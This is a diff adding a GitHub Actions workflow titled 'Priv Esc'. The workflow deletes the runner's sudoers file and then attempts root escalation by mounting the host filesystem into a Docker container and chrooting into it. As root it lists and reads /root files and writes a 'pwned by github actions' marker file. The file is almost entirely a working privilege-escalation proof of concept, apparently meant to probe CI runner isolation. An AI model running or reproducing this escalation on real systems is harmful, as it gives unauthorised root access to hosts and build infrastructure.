@@ -1,0 +1,81 @@
+name: Priv Esc
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  break-sudo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Remove sudoers.d for runner
+        run: sudo rm /etc/sudoers.d/runner
+
+      - name: Try to gain sudo here
+        run: |
+          echo "=== [*] Initial context ==="
+          echo "[*] whoami:"
+          whoami || true
+          echo "[*] id:"
+          id || true
+          echo "[*] groups:"
+          groups || true
+          echo "[*] Kernel / OS:"
+          uname -a || true
+          cat /etc/os-release || true
+
+          echo
+          echo "=== [*] Checking Docker-based privilege escalation ==="
+          echo "[*] Looking for docker socket:"
+          ls -l /var/run/docker.sock || echo "[-] /var/run/docker.sock not found"
+
+          echo "[*] Checking docker version:"
+          if ! command -v docker >/dev/null 2>&1; then
+            echo "[-] docker command not found, cannot use Docker-based escalation"
+          else
+            docker version || echo "[-] docker version failed (may still be usable)"
+          fi
+
+          echo
+          echo "=== [*] Attempting Docker -> Host root via chroot ==="
+          if command -v docker >/dev/null 2>&1; then
+            docker run --rm -v /:/host ubuntu bash -c '
+              echo "[*] Inside container. whoami/id here:"
+              whoami || true
+              id || true
+
+              echo "[*] Attempting chroot into host filesystem..."
+              if command -v chroot >/dev/null 2>&1; then
+                chroot /host bash -c "
+                  echo \"[+] Inside host namespace via chroot\"
+                  echo \"whoami: \$(whoami)\"
+                  echo \"id: \$(id)\"
+
+                  echo
+                  echo \"[+] Trying to read /root directory listing (should be root-only):\"
+                  ls -ld /root || echo \"could not stat /root\"
+                  ls -la /root || echo \"could not list /root\"
+
+                  echo
+                  echo \"[+] Trying to read /root/.bashrc (root-only file, proof of root):\"
+                  head -n 10 /root/.bashrc || echo \"could not read /root/.bashrc\"
+
+                  echo
+                  echo \"[+] Creating a root-owned marker file for proof:\"
+                  echo \"pwned by github actions\" > /pwned_by_root_from_github_actions.txt || echo \"could not create marker file\"
+                  ls -l /pwned_by_root_from_github_actions.txt || true
+                "
+              else
+                echo "[-] chroot not available inside container"
+              fi
+            '
+          else
+            echo "[-] Skipping Docker exploit, docker is not available"
+          fi
+
+          echo
+          echo "=== [*] Final host-side check for marker file (if Docker exploit worked) ==="
+          ls -l /pwned_by_root_from_github_actions.txt || echo "[-] Marker file not found (Docker path likely failed)"
+
+          echo
+          echo "=== [*] Done. If you saw whoami=id as root inside chroot, escalation worked. ==="
